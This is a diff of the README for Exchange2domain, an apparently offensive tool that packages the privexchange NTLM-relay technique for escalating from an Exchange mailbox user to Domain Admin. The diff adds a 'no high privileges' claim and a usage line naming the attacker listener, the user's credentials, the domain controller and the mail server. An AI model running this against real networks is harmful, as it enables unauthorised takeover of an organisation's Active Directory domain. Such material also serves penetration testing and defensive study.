@@ -1,6 +1,6 @@
 # Exchange2domain
 
-All in One tools of [privexchange](https://github.com/dirkjanm/privexchange/).
+All in One tools of [privexchange](https://github.com/dirkjanm/privexchange/) . You only need to open the web server port, so **no high privileges are required**.
 
 Great writeup! [Abusing Exchange: One API call away from Domain Admin](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/).
 
@@ -62,10 +62,10 @@ optional arguments:
 
 example:
 ```
-python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th DCip MailServerip
+python Exchange2domain.py -ah attackterip   -ap listenport -u user -p password -d domain.com -th DCip MailServerip 
 ```
 
-![](https://blogpics-1251691280.file.myqcloud.com/imgs/20190124140647.jpg)
+![](https://blogpics-1251691280.file.myqcloud.com/imgs/20190129132650.png)
 
 
 
